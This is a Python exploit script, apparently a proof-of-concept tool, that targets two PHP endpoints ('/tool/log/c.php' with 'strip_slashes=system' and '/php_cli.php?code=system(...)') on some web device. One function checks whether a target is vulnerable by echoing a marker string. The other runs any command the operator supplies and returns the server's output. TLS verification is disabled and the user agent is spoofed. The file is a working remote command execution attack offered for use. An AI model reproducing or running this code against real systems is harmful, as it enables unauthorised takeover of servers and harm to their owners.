# -*- coding: utf-8 -*-
#author: cwbird
import re
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {
    'User-Agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Content-Type':'application/x-www-form-urlencoded'
}
def exp_check(url):


    payload1 = "/tool/log/c.php?strip_slashes=system&host="+"echo 7969676569776f6c696769616f"
    payload2 = "/php_cli.php?code=system('echo 7969676569776f6c696769616f');"
    try:
        r1 = requests.get(url+payload1,headers=headers,verify= False,timeout=5)
        r2 = requests.get(url+payload2,headers=headers,verify= False,timeout=5)
        if (r"7969676569776f6c696769616f" in r1.text) or (r"7969676569776f6c696769616f" in r2.text):
            return 1
        return 2
    except:
        return 3


def exp_cmd(url,cmd):
    payload1 = "/tool/log/c.php?strip_slashes=system&host="+cmd
    payload2 = "/php_cli.php?code=system({});".format(cmd)
    try:
        r1=requests.get(url+payload1,headers=headers,verify= False,timeout=5)
        r2 = requests.get(url+payload2,headers=headers,verify= False,timeout=5)
        if r1.text != "":
            return r1.text
        if r2.text != "":
            return r2.text
    except:
        return 3